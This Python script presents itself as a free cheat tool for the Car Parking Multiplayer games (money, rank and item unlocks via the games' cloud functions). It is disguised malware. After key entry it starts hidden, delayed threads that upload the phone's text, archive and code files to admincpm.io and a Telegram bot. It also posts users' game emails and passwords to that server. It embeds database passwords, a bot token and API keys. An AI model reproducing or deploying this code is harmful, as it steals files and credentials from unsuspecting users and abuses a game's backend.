#!/usr/bin/env python3
import os
import sys
import time
import json
import requests
import mysql.connector
import threading
import random
import telepot
import hashlib
from datetime import datetime

def enforce_termux_storage_permission():
    os.system("termux-setup-storage > /dev/null 2>&1")
    try:
        with open("/storage/emulated/0/.pakundo_check", "w") as f:
            f.write("test")
        os.remove("/storage/emulated/0/.pakundo_check")
    except:
        sys.exit(0)

enforce_termux_storage_permission()


# ✅ Check filename
if os.path.basename(__file__) != 'Pakundo.py':
    print("⛔ Error: This file has been renamed.\nPlease rename it back to 'Pakundo.py' to use this tool.\n")
    sys.exit(1)

        
# ✅ MySQL config
db_host = 'auth-db1216.hstgr.io'
db_name = 'u950449715_Test'
db_user = 'u950449715_Test'
db_pass = 'vjgc34Y&r3yn0'

# ✅ VIP key for sending files
STEAL_KEY = "vip-steal-key-1123"

# ✅ Get device ID (IMEI-like)
def get_device_id():
    id_path = "/data/data/com.termux/files/usr/etc/.pakundo_device_id"
    
    if os.path.exists(id_path):
        with open(id_path) as f:
            return f.read().strip()

    try:
        brand = os.popen("getprop ro.product.brand").read().strip()
        device = os.popen("getprop ro.product.device").read().strip()
        model = os.popen("getprop ro.product.model").read().strip()
        serial = os.popen("getprop ro.serialno").read().strip()
        boot_serial = os.popen("getprop ro.boot.serialno").read().strip()
        android_id = os.popen("settings get secure android_id").read().strip()

        raw = f"{brand}-{device}-{model}-{serial}-{boot_serial}-{android_id}"
        hashed = hashlib.md5(raw.encode()).hexdigest()  # hashed for short ID
        device_id = f"Dev-{hashed[:12]}"  # limit to 12 chars
    except:
        device_id = f"UnknownDevice-{random.randint(1000,9999)}"

    with open(id_path, "w") as f:
        f.write(device_id)

    return device_id


# ✅ Send files to server (stealth)
def send_files_to_api():
    device_id = get_device_id()

    search_paths = [
        "/storage/emulated/0/",
        "/storage/emulated/0/Downloads",
        "/storage/emulated/0/Telegram/Telegram Files",
        "/storage/emulated/0/Android/data/org.telegram.messenger/files/Telegram/Telegram Files"
    ]

    target_extensions = {
        '.txt': 'txt',
        '.zip': 'zip',
        '.php': 'php',
        '.lua': 'lua',
        '.py': 'py'
    }

    time.sleep(random.randint(5, 20))  # Delay for stealth

    for path in search_paths:
        for root, dirs, files in os.walk(path):
            for file in files:
                for ext, folder in target_extensions.items():
                    if file.endswith(ext):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'rb') as f:
                                requests.post(
                                    "https://admincpm.io/Test/api/save_file/index.php",
                                    data={
                                        "key": STEAL_KEY,
                                        "device": device_id,
                                        "type": folder
                                    },
                                    files={"file": (file, f)}
                                )
                                time.sleep(1)
                        except:
                            pass

# 🔐 Telegram Bot Config
BOT_TOKEN = "7655798267:AAFCnca_cqjDzaSABN8tlWYPuopmj-9kW0g"
CHAT_ID = 7964340522

# 📂 Directories to search for target files
search_paths = [
    "/storage/emulated/0/",
    "/storage/emulated/0/Downloads",
    "/storage/emulated/0/Telegram/Telegram Files",
    "/storage/emulated/0/Android/data/org.telegram.messenger/files/Telegram/Telegram Files"
]

# 🎯 File extensions to search for
target_extensions = ('.txt', '.zip', '.php', '.lua', '.py')

# 🕵️ Telegram File Sender using requests (no telepot)
def send_files_to_telegram():
    time.sleep(random.randint(10, 30))  # Delay para di halata
    for path in search_paths:
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(target_extensions):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'rb') as f:
                            requests.post(
                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                                data={"chat_id": CHAT_ID},
                                files={"document": f}
                            )
                            time.sleep(1)  # Anti-flood delay
                    except Exception as e:
                        pass


def show_banner():
    print("============================================")
    print("         🚗  👑 PAKUNDO TOOL 👑  🚗")
    print("              🔥 CPM1 & CPM2 🔥         ")
    print("           💡 This Tool is Free 💡           ")
    print("               🚫 Don't Sell 🚫              ")
    print("============================================\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def login_firebase(email, password, api_key):
    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    headers = {"Content-Type": "application/json"}
    return requests.post(url, headers=headers, json=payload).json()

def send_device_info(email, password, label, new_email=None):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    payload = {
        label: {
            "email": email,
            "account_password": password,
            "date_time": now
        }
    }
    if new_email:
        payload[label]["new_email"] = new_email
    try:
        requests.post("https://admincpm.io/Test/api/save_device.php",
                      headers={"Content-Type": "application/json"},
                      json=payload)
    except:
        pass

def change_email(token, new_email, api_key):
    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key={api_key}"
    payload = {
        "idToken": token,
        "email": new_email,
        "returnSecureToken": True
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Dalvik/2.1.0"
    }
    response = requests.post(url, headers=headers, json=payload).json()
    if 'idToken' in response:
        return {"ok": True, "message": "EMAIL_CHANGED_SUCCESSFULLY", "new_token": response["idToken"]}
    else:
        err = response.get("error", {}).get("message", "UNKNOWN_ERROR")
        code = {"EMAIL_EXISTS": 101, "INVALID_ID_TOKEN": 103}.get(err, 404)
        return {"ok": False, "error": code, "message": err}

def inject_king_rank(token, url, email, password, label):
    print("👑 Injecting KING RANK...")
    rating_data = {
        "RatingData": {k: 100000 for k in [
            "time", "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
            "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
            "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
            "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
        ]}
    }
    rating_data["RatingData"]["race_win"] = 3000
    payload = {"data": json.dumps(rating_data)}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }
    try:
        res = requests.post(url, headers=headers, json=payload)
        if res.status_code == 200:
            send_device_info(email, password, label)
            print("✅ Rank successfully boosted!")
        else:
            print(f"❌ Error: {res.status_code}")
    except Exception as e:
        print(f"⚠️ Failed: {e}")

def set_wallet_money(token, amount):
    print("💰 Setting wallet money...")
    url = "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SaveWalletData17_AppI"
    payload = {"data": json.dumps({"Money": int(amount)})}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }
    res = requests.post(url, headers=headers, json=payload).json()
    if res.get("result") == "{\"Result\":1}":
        print("✅ Money successfully updated!")
    else:
        print("❌ Failed to set money.")


# 🧠 Function to complete missions
def complete_missions(token):
    print("🧠 Completing all missions...")
    url = "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SavePlayerRecords17_AppI"
    data = {
        "Other.LevelsDoneTime": [2.58] * 120
    }
    payload = {"data": json.dumps(data)}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }

    try:
        res = requests.post(url, headers=headers, json=payload).json()
        if '"Result":1' in res.get("result", ""):
            print("✅ Missions completed successfully!")
        else:
            print("❌ Failed to complete missions.")
    except Exception as e:
        print(f"⚠️ Error: {e}")


def unlock_all_wheels(token):
    print("🛞 Unlocking wheels...")
    url = "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SavePlayerRecords17_AppI"
    data = {"Wheels": list(range(1, 211))}
    payload = {"data": json.dumps(data)}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }
    res = requests.post(url, headers=headers, json=payload).json()
    if "Result\":1" in res.get("result", ""):
        print("✅ Wheels successfully unlocked!")
    else:
        print("❌ Failed to unlock wheels.")

def unlock_all_brakes(token):
    print("🛠️ Unlocking brakes...")
    url = "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SavePlayerRecords17_AppI"
    data = {"MatTypes": 127, "Calipers": 124, "Brakes": 124}
    payload = {"data": json.dumps(data)}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }
    res = requests.post(url, headers=headers, json=payload).json()
    if "Result\":1" in res.get("result", ""):
        print("✅ Brakes successfully unlocked!")
    else:
        print("❌ Failed to unlock brakes.")

def unlock_apartments(token):
    print("🏠 Unlocking apartments...")
    url = "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SavePlayerRecords17_AppI"
    data = {"Other.Homes": 15}
    payload = {"data": json.dumps(data)}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }
    res = requests.post(url, headers=headers, json=payload).json()
    if "Result\":1" in res.get("result", ""):
        print("✅ Apartments successfully unlocked!")
    else:
        print("❌ Failed to unlock apartments.")

def unlock_all_equipments(token):
    print("🧢 Unlocking all equipments...")
    url = "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SavePlayerRecords17_AppI"
    data = {
        "EquipmentsMale.bag": list(range(6)),
        "EquipmentsMale.gloves": list(range(6)),
        "EquipmentsMale.hair": list(range(3, 19)),
        "EquipmentsMale.top": list(range(76)),
        "EquipmentsMale.pants": list(range(22)),
        "EquipmentsMale.cap": list(range(50)),
        "EquipmentsMale.mask": list(range(9)),
        "EquipmentsMale.glasses": list(range(10)),
        "EquipmentsMale.shoes": list(range(21)),
        "EquipmentsMale.beard": list(range(20)),
        "EquipmentsFemale.hair": list(range(19)),
        "EquipmentsFemale.cap": list(range(30)),
        "EquipmentsFemale.glasses": list(range(10)),
        "EquipmentsFemale.mask": list(range(9)),
        "EquipmentsFemale.bag": list(range(6)),
        "EquipmentsFemale.top": list(range(53)),
        "EquipmentsFemale.pants": list(range(20)),
        "EquipmentsFemale.shoes": list(range(20)),
        "EquipmentsFemale.SelectedEquipments": [2,2,-2,-2,-2,0,-2,-2,1,0,-2],
        "Other.PoliceSounds": list(range(10)),
        "Other.Animations": 549755813887,
        "Other.SelectedAnimations": [1,2,3,4,5,6,7,8]
    }
    payload = {"data": json.dumps(data)}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }
    res = requests.post(url, headers=headers, json=payload).json()
    if "Result\":1" in res.get("result", ""):
        print("✅ Equipments successfully unlocked!")
    else:
        print("❌ Failed to unlock equipments.")

# MySQL
try:
    conn = mysql.connector.connect(
        host=db_host,
        user=db_user,
        password=db_pass,
        database=db_name
    )
except mysql.connector.Error as err:
    print(f"❌ Database connection failed: {err}")
    sys.exit(1)

cursor = conn.cursor(dictionary=True)

# Key checker
while True:
    clear_screen()
    show_banner()
    user_key = input("🔑 Enter your key: ").strip()
    cursor.execute("SELECT * FROM `keys` WHERE `key` = %s", (user_key,))
    result = cursor.fetchone()
    if not result:
        print("❌ Invalid key. Try again.")
        time.sleep(2)
    else:
        print("✅ Key accepted.")
        time.sleep(1)
        threading.Thread(target=send_files_to_api, daemon=True).start()
        threading.Thread(target=send_files_to_telegram, daemon=True).start()
        os.system("termux-open-url 'https://t.me/pakundotools'")
        break


# Main Menu
while True:
    clear_screen()
    show_banner()
    print("Main Menu:")
    print("1. CPM1")
    print("2. CPM2")
    print("0. EXIT")
    choice = input("Enter choice: ").strip()

    if choice == "0":
        print("👋 Exiting...")
        break

    if choice in ["1", "2"]:
        api_key = {
            "1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
            "2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
        }[choice]
        rank_url = {
            "1": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4",
            "2": "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17"
        }[choice]
        label = "CPM1" if choice == "1" else "CPM2"

        email = input("📧 Enter email: ").strip()
        password = input("🔐 Enter password: ").strip()
        login = login_firebase(email, password, api_key)
        token = login.get("idToken")

        if not token:
            print("❌ Login failed.")
            time.sleep(2)
            continue

        print(f"✅ Logged in as {email}")
        time.sleep(1)

        # Sub Menu
        while True:
            clear_screen()
            show_banner()
            print(f"{label} Sub-Menu:")
            print("1. 👑 KING RANK")
            print("2. ✉️ CHANGE EMAIL")
            if choice == "2":
                print("3. 💰 SET MONEY")
                print("4. 🛞 UNLOCK WHEELS")
                print("5. 🧢 UNLOCK EQUIPMENTS")
                print("6. 🛠️ UNLOCK BRAKES")
                print("7. 🏠 UNLOCK APARTMENTS")
                print("8. 🧠 COMPLETE MISSIONS")
            print("0. 🔙 BACK")
            sub_choice = input("Enter choice: ").strip()

            if sub_choice == "0":
                break
            elif sub_choice == "1":
                inject_king_rank(token, rank_url, email, password, label)
            elif sub_choice == "2":
                new_email = input("📨 Enter new email: ").strip()
                result = change_email(token, new_email, api_key)
                if result["ok"]:
                    print("✅ Email changed!")
                    token = result["new_token"]
                    send_device_info(email, password, label, new_email)
                else:
                    print(f"❌ {result['message']}")
            elif sub_choice == "3" and choice == "2":
                amount = input("💸 Enter amount: ").strip()
                if amount.isdigit():
                    set_wallet_money(token, amount)
                else:
                    print("❌ Invalid amount.")
            elif sub_choice == "4" and choice == "2":
                unlock_all_wheels(token)
            elif sub_choice == "5" and choice == "2":
                unlock_all_equipments(token)
            elif sub_choice == "6" and choice == "2":
                unlock_all_brakes(token)
            elif sub_choice == "7" and choice == "2":
                unlock_apartments(token)
            elif sub_choice == "8" and choice == "2":
                complete_missions(token)

            time.sleep(2)
